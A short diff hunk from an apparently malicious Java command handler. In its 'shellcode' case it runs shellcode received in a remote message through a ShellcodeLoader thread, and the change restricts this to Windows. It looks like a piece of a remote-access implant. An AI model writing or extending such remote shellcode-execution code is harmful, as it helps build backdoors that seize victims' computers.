@@ -76,7 +76,7 @@ public class MessageHandler {
                     break;
                 case "shellcode":
                     if (msgArr.length < 2) break;
-                    new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
+                    if(ShellUtil.isWin()) new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                 default:
                     System.out.println();
                     break;
